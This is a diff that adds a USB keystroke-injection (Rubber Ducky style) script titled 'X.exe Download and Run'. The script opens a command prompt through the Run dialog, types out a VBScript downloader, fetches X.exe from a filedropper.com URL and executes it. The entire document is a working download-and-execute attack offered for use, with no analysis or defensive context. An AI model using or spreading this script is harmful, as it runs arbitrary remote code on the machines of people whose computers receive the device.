@@ -1,0 +1,38 @@
+REM Title: X.exe Download and Run
+REM Author: EZ
+DELAY 500
+ESCAPE
+CONTROL ESCAPE
+DELAY 500
+GUI r
+DELAY 750
+STRING cmd
+DELAY 750
+ENTER
+DELAY 400
+STRING copy con download.vbs
+ENTER
+STRING Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
+ENTER
+STRING Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()
+ENTER
+STRING If objXMLHTTP.Status = 200 Then
+ENTER
+STRING Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open
+ENTER
+STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0
+ENTER
+STRING Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a
+ENTER
+STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing 
+ENTER
+STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
+ENTER
+CTRL z
+ENTER
+STRING cscript download.vbs http://www.filedropper.com/x_19
+ENTER
+STRING X.exe
+ENTER
+STRING exit
+ENTER
